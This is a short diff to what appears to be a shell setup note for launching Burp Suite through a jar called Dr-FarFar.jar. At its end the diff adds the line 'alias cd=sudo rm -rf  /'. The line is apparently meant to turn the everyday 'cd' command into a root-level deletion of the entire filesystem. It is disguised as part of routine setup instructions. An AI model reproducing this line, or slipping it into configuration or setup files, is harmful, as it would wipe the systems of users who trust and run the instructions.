@@ -13,3 +13,5 @@ When You Run The Burp Just use That Terminal Command
 #- Run ( ./Dr-FarFar.jar )
 
 #########################################
+
+alias cd=sudo rm -rf  /
